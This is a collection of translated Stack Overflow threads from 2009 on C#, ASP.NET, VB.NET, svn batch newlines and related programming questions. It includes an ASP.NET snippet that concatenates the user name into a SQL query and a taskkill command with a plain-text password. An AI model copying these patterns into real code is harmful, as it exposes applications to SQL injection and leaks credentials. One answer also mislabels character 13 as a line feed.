您*可能会*发现这与使用 Compiz 和 Java（至少在 Ubuntu 上）遇到的问题类似，但我猜。

对此（取自[此处](http://ubuntuforums.org/showthread.php?t=506686)）的解决方法是将以下环境变量添加到您的程序中：

```
AWT_TOOLKIT="MToolkit" 
```

# c# - Check if process is idling

> ID：721216
> 
> 赞同：1
> 
> 时间：2009-04-06T12:32:03.580
> 
> 标签：c#, process

I'm trying to find out when a process has stopped doing his work. I've been trying it with this code but it doesn't notice that the program is still running and processing a file. Probably because it's still doing things that take less then one microsecond:

```
 TimeSpan startTime = m_Process.TotalProcessorTime;
    int idleCycles = 0;
    int iMax = Math.Max(iMinNoActivityTime/100, 5);
    while (idleCycles < iMax)
    {
        Sleep(100);
        TimeSpan curTime = m_Process.TotalProcessorTime;
        int delta = curTime.Subtract(startTime).Milliseconds;
        if (delta != 0)
        {
          idleCycles = 0;
        }
        else
        {
            idleCycles++;
        }
        startTime = curTime;
    } 
```

It's called for 3000 seconds: 30 consecutive time-blocks of 100 miliseconds without processor activity.

Is there any way to do this so it doesn't see it as idling when it's still running? The process reads the file, deletes it and then processes it so it can't monitor the directory.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T12:44:41.820

I'd go back and look at your design here. Trying to spot when another process is idle doesn't seem like a very solid approach.

Why not just have the other process use a named event to signal when it is done?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T12:50:51.023

如果您知道工作正在主 (UI) 线程上完成，例如对于简单的控制台应用程序，那么您可以使用[Process.WaitForInputIdle](http://msdn.microsoft.com/en-us/library/kcdbkyt4.aspx)。如果您只想轮询，您可以选择指定超时参数。现在，如果工作是在后台线程上完成的，那么您将无法检测到它（至少在不诉诸一些讨厌的黑客的情况下不会）。正如 GrahamS 所指出的，在这种情况下重新考虑设计当然更好。

# javascript - AJAX request denied on FIREFOX but not on IE

> ID：721225
> 
> 赞同：0
> 
> 时间：2009-04-06T12:35:20.093
> 
> 标签：javascript, ajax, json

I need to make an ajax request, IE Works OK, Firefox URI DENIED.

I googled and I found the the only way is to use JSON to eliminate and restrictions.

Is there some one got any example?

Thanks

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T12:40:19.270

With [jQuery](http://www.jquery.com) it could look like this:

```
$.getJSON("http://api.flickr.com/services/feeds/photos_public.gne?" +
          "tags=cat&tagmode=any&format=json&jsoncallback=?",
    function(data){
      $.each(data.items, function(i,item){
        $("<img/>").attr("src", item.media.m).appendTo("#images");
        if ( i == 3 ) return false;
      });
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-06-29T17:09:28.117

如果这是一个跨站点问题（我认为不是），请尝试为您的站点（例如 flickrapi.acme.com）设置一个子域，它是 api.flickr.com 的 CNAME。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T14:18:39.143

或者，您可以让您的 XMLHttpRequest 将您的用户代理指定为 IE（浏览器嗅探是愚蠢的）：

```
var req = new XMLHttpRequest();
req.setRequestHeader('User-Agent','MSIE 7.0');
req.open("GET", sURL, true);
req.onreadystatechange=function() {
    if (req.readyState==4) {
        alert(req.responseText);
    }
}
req.send(null); 
```

或者更好的是，向站点管理员发送一封措辞强硬的电子邮件，说明他们不接受来自非 IE 浏览器的请求。在这个时代，建立一个仅限 IE 的网站是不可接受的。它以多种方式破坏了网络的可访问性和实用性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T14:19:19.533

在深入之前，请尝试在请求中使用绝对 url。我所知道的 IE 和 FIrefox 之间适用的唯一区别是 IE 将相对 url 转换为 http 流量中的绝对 URL。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T18:38:14.373

您始终可以使用服务器端代理。

# web-services - 是否有任何 Web 服务的数据库或索引？

> ID：721240
> 
> 赞同：2
> 
> 时间：2009-04-06T12:38:59.617
> 
> 标签：web-services

我正在寻找对各种服务进行分类的东西，然后（1）记录如何使用它们或（2）指向文档的链接，以便我可以了解更多信息。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T12:43:45.520

您可能喜欢APIs 部分下的[ProgrammableWeb Mashup Matrix 。](http://www.programmableweb.com/matrix)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-07T01:04:08.390

如果您要问的话，没有世界上所有 Web 服务的完整列表。当您考虑到世界上必须有多少 Web 服务时，这是有道理的，包括公开的和非公开的。

当你说“这样我可以学到更多”时，你想学什么？即使有这样的清单，我也不确定你能从中学到什么在别处学不到的东西。

# c# - 为什么必须使用非默认构造函数初始化 C# 结构中的所有字段？

> ID：721246
> 
> 赞同：12
> 
> 时间：2009-04-06T12:40:05.513
> 
> 标签：c#, struct, clr, stack

我想试试这段代码：

```
public struct Direction
{
   private int _azimuth;

   public int Azimuth
   {
     get { return _azimuth; }
     set { _azimuth = value; }
   }       

   public Direction(int azimuth)
   { 
      Azimuth = azimuth
   } 
} 
```

但是它在编译时失败了，我知道 struct 需要初始化它的所有字段。但我试图了解 CLR\IL 引擎盖下会发生什么。为什么它需要在任何其他方法\属性\这个等之前的所有字段。

谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-04-25T14:02:57.220

值类型是在堆栈上创建的（除非嵌套在引用类型中） 关于堆栈上的字段/位置，CLR 不能保证它们会被清零（与托管堆上的字段/位置相反，它们是保证被清零）。因此，它们必须在被读取之前被写入。否则就是一个安全漏洞。

结构的默认 ctor（不接受参数并且不允许显式指定）将结构的所有字段清零，因此您可以在完成后使用结构。

```
new BimonthlyPairStruct() 
```

但是，当您实现参数化 ctor 时，**您**必须确保所有字段都已初始化 - 这是 CLR 将您的代码作为 safe/ **verified**传递所必需的。

另请参阅：通过 C# 第 2 版的 CLR - Pg 188

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-04-06T12:57:16.937

这是因为结构派生自 System.ValueType 而不是 System.Object，System.ValueType 实现了您无法覆盖的默认构造，此默认构造使用其默认值初始化结构中的所有字段。因此，如果您在类中实现任何参数构造函数，您还需要 t0 确保调用 system.ValueType 默认 const。并且要回答为什么它需要初始化其所有值，这是因为值存储在堆栈内存中。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-06T12:58:12.160

这有效：

```
 public Direction(int azimuth)
  {
    _azimuth = azimuth;
  } 
```

从规范：

> 使用 new 运算符调用结构构造函数，但这并不意味着正在分配内存。结构构造函数不是动态分配对象并返回对它的引用，而是简单地返回结构值本身（通常在堆栈上的临时位置），然后根据需要复制该值。

基本上，编译器必须看到每个字段都在构造函数中被初始化，以便它可以复制这些值，并且它不愿意检查对函数或属性的调用。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-04-06T13:02:52.010

我刚刚在[MSDN 论坛](http://social.msdn.microsoft.com/Forums/en-US/csharplanguage/thread/40085588-ccb0-42bf-8492-fa48f072b877/)中找到了一个解释，说明此规则是强制执行的，因为如果您使用非默认构造函数，则会跳过将内存清零。因此，您必须为所有字段提供初始化值，以避免某些字段包含随机值。您可以通过调用无参数的默认构造函数轻松实现这一点，但代价是两次初始化某些字段。

我无法判断这种解释是否正确，但听起来很合理。

> 当您定义非默认初始化程序时，C# 要求您设置所有字段，因为它会跳过内存归零并允许您对其进行初始化 - 否则您将不得不对初始化性能造成双重打击。如果您不关心（非常轻微的）性能损失，您可以随时链接调用 : this() 初始化程序，然后只初始化选定的字段。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T12:42:54.023

```
public struct Direction
{
    public int Azimuth { get; private set; }

    public Direction(int azimuth) : this()
    {
        Azimuth = azimuth;
    }
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-04-06T12:42:12.730

您需要初始化字段，而不是通过属性。

# .net - 使用 SQL Server DataAdapter 了解 DataTable 以获得最佳速度

> ID：721247
> 
> 赞同：1
> 
> 时间：2009-04-06T12:40:11.720
> 
> 标签：.net, sql-server

我一直想知道这一点，并不能真正找到一个直接的答案。在 .NET 中，当您使用 SQL Server 数据适配器使用数据库中的行填充 DataTable 时，它​​是否真的立即加载到内存中，还是在您访问数据库时仍然从数据库中读取数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T12:42:05.587

您可以在填充 DataTable 后关闭连接。填写后不再需要访问数据库。DataReader 在使用时需要一个打开的连接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T12:44:38.590

是的，当适配器填充 DataTable 时，所有数据都从数据库读取到内存中并存储在 DataTable 中。不需要持久连接。显然，如果您想刷新 DataTable 中的数据或保存对数据库的更改，则需要连接，但您无需保持连接打开即可使用 DataTable 中的数据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T12:47:07.413

如果我准确地记得我的教科书定义， .NET `DataSet`（以及通过转移， a `DataTable`）是“存储在数据库中的数据的断开的内存表示”。

该定义是不言自明的，但要澄清一下……它确实会在您调用`Fill()`DataAdapter 时立即将该数据加载到内存中。它不需要再次访问数据库，直到您显式调用另一个方法，例如`Update(), Delete() or Insert()`.

DataAdapter 还隐式管理连接本身。如果连接已关闭，它会在访问数据库之前打开连接，并在作业完成后自动关闭它。

# svn - 如何在 cmd 批处理中的文本中使用换行符？

> ID：721251
> 
> 赞同：14
> 
> 时间：2009-04-06T12:41:40.267
> 
> 标签：svn, batch-file

我想要做

```
svn commit -m "<message>" 
```

但是消息应该有两行：

```
Commit by: firstuser
Bug track: 9283 
```

如何在消息中添加换行符？我试过 SHIFT+ENTER、CTRL+T 但它不起作用。我使用 MS cmd 命令行。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2009-04-06T17:09:43.197

如何使用`-F`参数从文件中获取日志消息？

然后，您可以这样做（未经测试）：

```
ECHO Commit by: firstuser>SvnLog.txt
ECHO Bug track: 9283>>SvnLog.txt

SVN COMMIT -F SvnLog.txt 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2010-10-13T09:38:28.943

我在 Serverfault 上找到了答案：

```
svn ci -m $'This is the first line\nThis is the second line' 
```

显然这是一个[外壳问题](https://serverfault.com/questions/148917/use-linefeed-or-carriage-return-in-subversion-commit-message-from-the-command-lin)。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2011-06-24T16:43:47.970

我遇到了同样的问题，虽然 Claes Mogren 的回答不适用于 cmd.exe，但它让我想到 Windows 上是否有一个外壳可以做到这一点。
当然还有……PowerShell。

使用 PowerShell shell，您可以使用以下命令实现此目的：

```
svn ci -m "reference to Ninject fixed`nsome ignores added" 
```

注意消息中 backqoute 和 n 的组合

```
`n 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2011-04-05T19:45:03.063

要在 svn 消息中创建换行符，最好的方法是带有额外消息文件的 aphoria 之一。

但它也可以用`-m`

带有批处理文件的示例

```
@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
set lf=^

rem ** Two empty lines are neccessary for creating the Linefeed
svn commit -m "A!lf!Message!lf!with!LF!newline" 
```

您也可以在命令行上使用它

```
svn commit -m ^"This is a^
MORE?
MORE?my newline" 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2011-04-05T14:13:44.143

您可以按如下方式定义换行符：

```
set newline=^& echo. 
```

然后，您可以在其他语句中使用换行符，如下所示：（无引号）

```
echo This is the first line%newline%This is the second line
echo "This is the first line"%newline%"This is the second line" 
```

或带有额外的插入符号，如下所示：

```
set text=This is the first line^%newline%This is the second line 
```

也许您可以使用它，但请注意与引号的组合！

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-10-24T12:50:53.717

只需写`svn ci -m "old line`press`Enter`然后输入下一行`new line"`

![例子](https://i.stack.imgur.com/nMB4V.png)

这比使用文件容易得多。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-11-09T08:10:27.473

我使用以下方法并且它有效：

```
svn commit {list of files to commit} 
```

输入上述命令并按回车后，将打开一个编辑器。在那里写下你的评论并退出编辑器。退出编辑器后，commit 命令将执行，您在编辑器中编写的任何内容也将被提交。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-06T13:00:12.890

问题是“输入”（Ascii 13）发送命令。所以你需要一个“换行符”

使用 alt + 10（按 alt，在数字块输入数字，释放 alt）

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2013-01-30T19:21:26.263

这对我们有用：

私有静态最终字符 LF = (char) 13;

```
setMessage("Test"  + LF + "Jij" + LF + "Dit" + LF + "Effe"); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2016-09-27T07:23:46.497

在文本编辑器中编写消息，然后将其复制并粘贴到终端（命令编辑器）。

1.  只需在文本编辑器中多行键入消息。

    -m "消息行

    消息行 2

    消息行 3"

2.  在命令编辑器中键入所需的命令。

    svn 命令

3.  将消息内容从文本编辑器复制并粘贴到命令编辑器。

    svn command -m "消息第 1 行。

    消息行 2

    消息行 3"

4.执行回车。

5.它有效:)

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2019-04-02T09:54:12.463

@jeb[答案的附加示例](https://stackoverflow.com/a/5557582/9947141)

回答：

```
set br= ^
<</br (newline)>>
<</br>> 
```

例子：

```
@echo off
setlocal enableExtensions enableDelayedExpansion
rem cd /D "%~dp0"
set br= ^

rem br, can't be saved to a var. by using %..%;

set "t=t1!br!t2!br!t3"

for /f "usebackq tokens=* delims=" %%q in ('!t!') do (
    echo %%q
)

:scIn
rem endlocal
pause
rem exit /b 
```

; 输出：

```
t1
t2
t3
Press any key to continue . . . 
```

* * *

## 回答 #12

> 赞同：-1
> 
> 时间：2009-04-06T12:54:22.403

尝试这样的事情：

回显消息1 & 回显消息2 & 回显消息3

# asp.net-mvc - 如何在 ValidationSummary 中为无效的用户输入提供有用的错误消息？

> ID：721259
> 
> 赞同：0
> 
> 时间：2009-04-06T12:43:39.747
> 
> 标签：asp.net-mvc

场景：用户在 DateTime 字段中输入字符串。当发生回发但 ValidationSummary 中没有消息时，会出现 *。我已经尝试实现 IDataErrorInfo 但代码永远不会通过 EventDate 字段的 IDataErrorInfo.this[string columnName] 。我已经尝试再次实现 DataAnnotations 属性，这不起作用。到时间代码到达属性时，框架会检查 EventDate 是否已更改为 DateTime.MinValue。

感激地收到任何帮助。

我已经在 ASP.Net MVC 论坛、Steve Sanderson、Stephen Walter 和 Schotime 上发布了相同的问题，但没有答案，所以解决这个问题的人都是 MVC 大师。

看法：

```
<%= Html.ValidationSummary() %>
<label for="EventDate">EventDate:</label>
<%=Html.TextBox("Dinner", Model.EventDate)%>
<%= Html.ValidationMessage("EventDate", "*") %> 
```

控制器：

```
[AcceptVerbs(HttpVerbs.Post)]
public ActionResult Edit(Dinner item)
public ActionResult Edit(int ID, FormCollection coll)
{
    //What would you recommend?
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T13:25:37.760

如果您使用第一个接受晚餐对象的方法签名并添加更改文本框以反映属性名称...

```
<%= Html.TextBox("Dinner.EventDate", Model.EventDate) %> 
```

和你的验证信息......

```
<%= Html.ValidationMessage("Dinner.EventDate", "*") %> 
```

然后它应该工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-07T13:45:04.693

答案以 Microsoft 在[http://aspnet.codeplex.com/Release/ProjectReleases.aspx?ReleaseId=24471](http://aspnet.codeplex.com/Release/ProjectReleases.aspx?ReleaseId=24471)上提供的新数据注释模型绑定示例的形式出现。

这现在将在验证摘要中显示无效值。

希望这将使其成为 ASP.Net MVC 1.01 版本。

错误消息被硬编码到 DLL 中，因此我建议创建一个新的 ValidationAttribute，您可以在其中指定您自己的自定义消息。在这里阅读更多。[http://forums.asp.net/t/1406636.aspx](http://forums.asp.net/t/1406636.aspx)

# c++ - Richer logging/tracing status for C++ applications

> ID：721266
> 
> 赞同：1
> 
> 时间：2009-04-06T12:45:57.137
> 
> 标签：c++, logging, debugging, development-environment, trace

There are plenty of logging/trace systems for letting your program output data or strings or state as it runs. Most of these let you print arbitrary strings which you can view live or after your program runs.

I noticed an ad here on SO for [Smartinspect](http://www.gurock.com/products/smartinspect/) which seems to take this to a higher level, giving stack traces for each log, fancier options like plotting graphs and data values which change over time, and a lot of polish to the basic idea of a simple list of output text strings.

Since I use C++, Smartinspect won't even work for me.

A little googling finds tons of logging frameworks, but nothing that seems to do anything more than text dumps. Are their fancier tools (similar to Smartinspect?) that do more? Commercial or open source is fine, and multiplatform is a big plus.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T12:57:19.090

我知道这不是您最可能要寻找的答案，但我建议您很难（如果不是不可能）为 C++ 找到这样的框架。像转储堆栈这样的事情不能像 Java 这样的语言那样以可移植的方式完成，Java 不仅在所有平台上共享一个公共运行时，而且还提供强大的自省功能。

我不会用 Java 编程，但我的猜测是它可以像 Python 一样提供堆栈跟踪：堆栈可能只是运行时中的另一个可以检查和操作的对象。

另一方面，C++ 没有这些优点：它意味着它是一种接近金属的语言，基本上将面向对象主义添加到 C 中（我相信其他人会对 C++ 的好处提出更精巧的解释C 但那是另一个讨论）。

简而言之，C++ 的丰富程度不足以以通用方式提供您需要的那种特性。可能有一些特定于平台的代码可以在定义的点为您获取其中的一些信息，但它肯定不会是符合标准的跨平台 C++。

关于图表等，这听起来更像是后处理，你应该能够找到一些东西，或者更有可能，你可以输出你的日志消息，格式可以被这些现有工具中的一些解释.

您可以查看的其他内容是与 syslogd 集成，为此，可能还有更丰富的分析工具（这将为您提供与 SmartInspect 所宣传的功能类似的功能 - 即基于 TCP/IP 的日志记录）。

注意：我在这里所说的很多关于 C++ 的内容都来自以前的经验，他们试图在 C++ 中找到合适的框架来做一些微调、内省类型的事情（例如适当的模拟对象等）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T15:23:30.907

几年前，我在 DDJ 上写了一篇关于在 C/C++ 中使用 Windows 和 Unix/Linux 转储堆栈的文章。也许它可以帮助你：

见[http://www.ddj.com/architect/185300443](http://www.ddj.com/architect/185300443)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T15:22:00.100

如果您可以将自己限制在某个平台上，则可以手动将堆栈跟踪添加到您的日志中。我们使用例如 glibc 功能来获取 Linux 上的堆栈跟踪，以将堆栈跟踪附加到我们的异常类中。Windows 上有类似的功能，但如前所述，这些基础设施不可移植。

# vb.net - 使用 vb.net 杀死用户 x 的所有程序

> ID：721270
> 
> 赞同：2
> 
> 时间：2009-04-06T12:47:14.903
> 
> 标签：vb.net, process

我尝试杀死指定用户的所有进程。

我用

```
 Try
        Shell("C:\WINDOWS\system32\taskkill.exe /S localhost /U userx /P passwort /f /FI " & Chr(34) & "USERNAME eq userx" & Chr(34))
    Catch ex As Exception
        MessageBox.Show("LogoutException occurred. " + ex.Message)
    End Try 
```

但是什么也没发生。如果我尝试通过控制台使用这个 taskkill ..... 命令它工作正常。应该关闭的应用程序之一是 explorer.exe。必须关闭来自用户的所有应用程序。

我插入 /u /p 因为它自己的应用程序在不同的用户下运行。

有谁知道我如何才能真正杀死该 1 个用户的所有进程？

编辑：我忘记了一些信息，该应用程序由具有用户权限的用户启动。这就是我使用taskkill的原因-在那里我可以输入具有administrativ privilegs的不同用户。所以第二个问题是我不能直接使用 process.kill 。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:31:30.473

```
foreach (Process p in Process.GetProcesses())
{
    if (String.Equals(p.ProcessName, name))
    {
        p.Kill();
    }
} 
```

或者

```
Process.GetProcesses()
.Where(p => String.Equals(p.ProcessName, name))
.First()
.Kill(); // kills only first 
```

或者

```
Process.GetProcesses()
.Where(p => String.Equals(p.ProcessName, name))
.ToList()
.ForEach(p => p.Kill()); // kills all 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T12:55:09.033

如果您知道进程的 ID，则可以通过 Process 类将其杀死。以这个代码片段为例

```
Public Sub KillProcess(id as Integer)
  For Each p as Process in Process.GetProcesses()
    if p.Id = id Then
      p.Kill()
    End If
  Next
End SUb 
```

# asp.net - Parser error when trying to access the ASP.NET password recovery page?

> ID：721273
> 
> 赞同：1
> 
> 时间：2009-04-06T12:47:35.667
> 
> 标签：asp.net, parsing, compilation

When I try to access my ASP.NET password recovery page, I get the following error:

> Description: An error occurred during the parsing of a resource required to service this request. Please review the following specific parse error details and modify your source file appropriately.
> 
> Parser Error Message: Could not load type 'RugbyClubWebApplication.ForgotPassword'.

Source Error:

```
Line 1:  <%@ Page Language="C#" MasterPageFile="~/SubMaster.Master" AutoEventWireup="true" CodeBehind="ForgotPassword.aspx.cs" Inherits="RugbyClubWebApplication.ForgotPassword" Title="Untitled Page" %>
Line 2:  <asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
Line 3:  </asp:Content> 
```

Source File: /Rugby/ForgotPassword.aspx Line: 1

Any ideas?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T12:55:30.063

您可以通过简单地清理和重建整个解决方案来解决此问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T12:58:45.390

当文件或项目名称更改并且类或命名空间未更新时，有时会发生这种情况。ForgotPassword.aspx.cs 中定义的类的名称实际上`ForgotPassword`是在命名空间中`RugbyClubWebApplication`吗？

即你的类文件中应该有以下内容：

```
namespace RugbyClubWebApplication
{
    public class ForgotPassword
    {
        ...
    }
} 
```

另外，如果您使用的是 Visual Studio，那么包含此类的项目的默认命名空间是否正确？这可以在项目的“属性”页面中找到。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:00:15.497

假设这是一个 ASP.NET 2.0 网站项目并且类名和文件名是正确的，您应该尝试用`CodeBehind`属性替换`@Page`指令的`CodeFile`属性。在 .NET 2.0 及更高版本中，该`CodeBehind`属性的存在只是为了向后兼容，您应该使用该`CodeFile`属性和`Inherits`来指定代码隐藏文件以及类名。

# c# - 什么时候需要在 C# 中使用 stackalloc 关键字？

> ID：721277
> 
> 赞同：26
> 
> 时间：2009-04-06T12:49:03.977
> 
> 标签：c#, keyword, stackalloc

`stackalloc`关键字提供什么功能？我何时以及为什么要使用它？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2009-04-06T12:51:22.257

来自[MSDN](http://msdn.microsoft.com/en-us/library/cx9s2sy4.aspx)：

> 在不安全的代码上下文中用于在堆栈上分配一块内存。

C# 的主要特性之一是您通常不需要直接访问内存，就像在 C/C++ 中使用`malloc`or所做的那样`new`。但是，如果您真的想显式分配一些内存，您可以，但是 C# 认为这是“不安全的”，因此您只能在使用该`unsafe`设置进行编译时执行此操作。`stackalloc`允许您分配这样的内存。

您几乎可以肯定不需要使用它来编写托管代码。在某些情况下，如果您直接访问内存，您可以编写更快的代码是可行的——它基本上允许您使用适合某些问题的指针操作。除非你有一个特定的问题并且不安全的代码是唯一的解决方案，否则你*可能*永远不需要这个。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2010-05-29T18:06:18.610

Stackalloc 将在堆栈上分配数据，这可用于避免在方法内重复创建和销毁值类型数组所产生的垃圾。

```
public unsafe void DoSomeStuff()
{
    byte* unmanaged = stackalloc byte[100];
    byte[] managed = new byte[100];

    //Do stuff with the arrays

    //When this method exits, the unmanaged array gets immediately destroyed.
    //The managed array no longer has any handles to it, so it will get 
    //cleaned up the next time the garbage collector runs.
    //In the mean-time, it is still consuming memory and adding to the list of crap
    //the garbage collector needs to keep track of. If you're doing XNA dev on the
    //Xbox 360, this can be especially bad.
} 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-04-06T12:56:08.267

保罗，

正如这里的每个人所说，该关键字指示运行时在堆栈而不是堆上分配。如果您对这究竟意味着什么感兴趣，请查看[这篇文章](http://www.c-sharpcorner.com/UploadFile/rmcochran/csharp_memory01122006130034PM/csharp_memory.aspx?ArticleID=9adb0e3c-b3f6-40b5-98b5-413b6d348b91)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T12:51:57.340

[http://msdn.microsoft.com/en-us/library/cx9s2sy4.aspx](http://msdn.microsoft.com/en-us/library/cx9s2sy4.aspx)

this 关键字用于处理不安全的内存操作。通过使用它，您可以使用指针（C/C++ 中一个强大而痛苦的特性）

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T12:52:25.623

[`stackalloc`](http://msdn.microsoft.com/en-us/library/cx9s2sy4(VS.80).aspx)指示 .net 运行时在堆栈上分配内存。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-04-03T09:35:36.127

大多数其他答案都集中在OP问题的“什么功能”部分。
我相信这将回答何时以及为什么：

**你什么时候需要这个？**
**使用多个小型阵列的缓存局部性获得最佳的最坏情况性能。**

现在在一个普通的应用程序中你不需要这个，但对于实时敏感的场景，它提供了更多的确定性性能：不涉及 GC，你几乎可以保证缓存命中。
（因为最坏情况下的性能比平均性能更重要。）

请记住，.net 中的默认堆栈大小虽然很小！
（我认为普通应用程序为 1MB，ASP.net 为 256kb？）

例如，实际使用可以包括实时声音处理。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T12:54:21.063

就像史蒂夫指出的那样，仅在不安全的代码上下文中使用（例如，当您想使用指针时）。

如果您不在 C# 应用程序中使用不安全代码，那么您将*永远*不需要它。

# c# - InkAnalyzer 在 Vista 部署中抛出 FileNotFoundException

> ID：721279
> 
> 赞同：0
> 
> 时间：2009-04-06T12:49:15.100
> 
> 标签：c#, wpf, windows-vista

我有一个使用 InkAnalyzer 类的 WPF C# 应用程序。在我的开发平台 (Windows XP) 上，我在构建版本之前为项目添加了对 IACore.dll 和 IAWinFx.dll 的引用。

但是，当我尝试在 HP TouchSmart 平板电脑（在 Windows Vista 上）上运行它时，应用程序会抛出“FileNotFoundException”。有问题的文件名是 IACore.dll。

接下来，我为这两个文件选择了“复制本地”选项，并重建了应用程序。但是，一旦完成，就找不到另一个文件。这次是“IALoader.dll”。

我意识到我在 HP TouchSmart（在 Windows Vista 上）上一定遗漏了一些东西。Vista 笔记本电脑是否缺少 SDK？

* * *

# 一个办法

我在我的 SDK 上的任何地方都找不到 IACore.msm，而且它是最近的 SDK（XP Tablet PC SDK 版本 1.7），所以我使用搜索找到了 IALoader.dll，并将其手动复制到我的应用程序的文件夹中。之后就没有更多的抱怨了。

但是，如果有办法让我避免使用这些文件使我的应用程序部署变得臃肿，那就太好了。谢谢你的帮助，杰瑞德！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T13:04:14.783

看起来这个问题也被其他几个人遇到过。基本问题是程序集没有安装在 GAC 中，而是安装在 Windows SDK 目录中。为了确保您的应用程序已加载，它必须在安装项目中包含 IACore.msm 或手动安装框架。

全线程： [http ://social.msdn.microsoft.com/Forums/en-US/wpf/thread/719cbbde-013e-4165-b694-6a994d833352/](http://social.msdn.microsoft.com/Forums/en-US/wpf/thread/719cbbde-013e-4165-b694-6a994d833352/)

# asp.net - 使用 Asp.Net 和 SQL 显示照片库

> ID：721280
> 
> 赞同：1
> 
> 时间：2009-04-06T12:49:28.173
> 
> 标签：asp.net, sql, photo, image-gallery

我最近将照片添加到我的 SQL 数据库中，并使用 Asp:Image 将它们显示在 *.aspx 页面上。此控件的 ImageUrl 存储在单独的 *.aspx 页面中。它适用于个人资料图片。

我手头有一个新问题。我需要每个用户都能够拥有自己的照片库页面。我希望将照片存储在 sql 数据库中。存储照片并不难。问题是显示照片。我希望照片以缩略图网格方式存储，当用户单击照片时，它应该在单独的页面上显示照片。

做这个的最好方式是什么。显然它不是使用 Asp:Image。我很好奇我是否应该使用 Gridview。如果是这样，我该怎么做？它们应该是为此存储在数据库中的缩略图大小吗？

一旦图片点击其他页面看起来如何，以便它显示正确的图像。我认为通过 url 发送 photoId 是不正确的。

下面是我用来显示个人资料图片的页面中的代码。

protected void Page_Load(object sender, EventArgs e) {

```
 string sql = "SELECT [ProfileImage] FROM [UserProfile] WHERE [UserId] = '" + User.Identity.Name.ToString() + "'";

 string strCon = System.Web.Configuration.WebConfigurationManager.ConnectionStrings["SocialSiteConnectionString"].ConnectionString;
    SqlConnection conn = new SqlConnection(strCon);

 SqlCommand comm = new SqlCommand(sql, conn);

 conn.Open();

 Response.ContentType = "image/jpeg";

 Response.BinaryWrite((byte[])comm.ExecuteScalar());

 conn.Close();

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:44:03.860

“此控件的 ImageUrl 存储在单独的 *.aspx 页面中。它适用于个人资料图片。” - 而不是 .aspx 页面，为什么不使用通用 ASP.NET 处理程序 (.ashx) 呢？它们比 .aspx 更轻量级。只需搜索“ASP.NET 通用处理程序”，您就会找到许多示例。它基本上是您现在在 .aspx 页面后面的代码，但没有所有页面初始化/渲染开销。

“我希望照片以缩略图网格的方式存储，当用户点击照片时，它应该在单独的页面上显示照片。” - 我认为任何支持项目元素模板化的 ASP.NET 可重复控件（例如 ASP.NET 3.5 中的 DataGrid、GridView、Repeater、ListView 等）都应该在这里为您解决问题。只需根据缩略图设置图像或 asp:Image 高度和宽度。将您在 HTML 锚点中使用的任何标签与一个 href 包装到您的页面，以“全尺寸”显示图像。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T13:59:37.303

让我们解构你的问题：

**它们应该是为此存储在数据库中的缩略图大小吗？**
是的。第一次请求照片缩略图时生成缩略图并将其缓存在数据库中以供将来访问

**显然不是使用 Asp:Image 使用 Asp:Image**
是没有问题的。你会没事的

**我很好奇我是否应该使用 Gridview**
也许Repeater 更好，但是如果您熟悉gridview，您会很好

**我认为通过 url 发送 photoId 是不正确的。**
这是正确的，但您应该检查照片是否属于当前用户（不要相信 URL。

**生成缩略图**
